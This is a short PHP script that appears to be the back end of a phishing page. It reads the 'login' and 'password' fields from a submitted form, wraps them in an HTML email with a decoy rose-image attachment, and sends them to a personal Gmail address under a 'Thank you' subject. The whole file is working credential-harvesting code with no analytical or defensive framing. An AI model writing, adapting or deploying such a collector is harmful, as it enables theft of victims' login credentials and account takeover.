<?php

$fromAddr = 'staff@example.com'; // the address to show in From field.
$recipientAddr = 'said.guerrab@gmail.com';
$subjectStr = 'Thank you';

$mailBodyText = <<<END89283
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<title>Thank You</title>
</head>
<body>
<p>
<b>Login:</b> {$_POST['login']}<br>
<b>Password:</b> {$_POST['password']}<br>
</p>
</body>
</html>
END89283;

$filePath = 'http://linepassions.free.fr/Fleurs/Photos/Rose_Rouge_en_bouton-1024.jpg';
$fileName = basename($filePath);
$fileType = 'image/jpeg';
/* to find out what string to use for type, see
 http://en.wikipedia.org/wiki/Internet_media_type 
or $_FILES['attachment']['type'];
*/

/* encode the email content */

$mineBoundaryStr='otecuncocehccj8234acnoc231';

$headers= <<<EEEEEEEEEEEEEE
From: $fromAddr
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="$mineBoundaryStr"

EEEEEEEEEEEEEE;

// Add a multipart boundary above the plain message 
$mailBodyEncodedText = <<<TTTTTTTTTTTTTTTTT
This is a multi-part message in MIME format.

--{$mineBoundaryStr}
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

$mailBodyText

TTTTTTTTTTTTTTTTT;

$file = fopen($filePath,'r'); 
$data = fread($file,filesize($filePath)); 
fclose($file);
$data = chunk_split(base64_encode($data));

// file attachment part
$mailBodyEncodedText .= <<<FFFFFFFFFFFFFFFFFFFFF
--$mineBoundaryStr
Content-Type: $fileType;
 name=$fileName
Content-Disposition: attachment;
 filename="$fileName"
Content-Transfer-Encoding: base64

$data

--$mineBoundaryStr--

FFFFFFFFFFFFFFFFFFFFF;

if (
mail( $recipientAddr , $subjectStr , $mailBodyEncodedText, $headers )
) {
  echo '<p>Send successfully!</p>';
} else {
  echo '<p>Bah!</p>';
}

?>
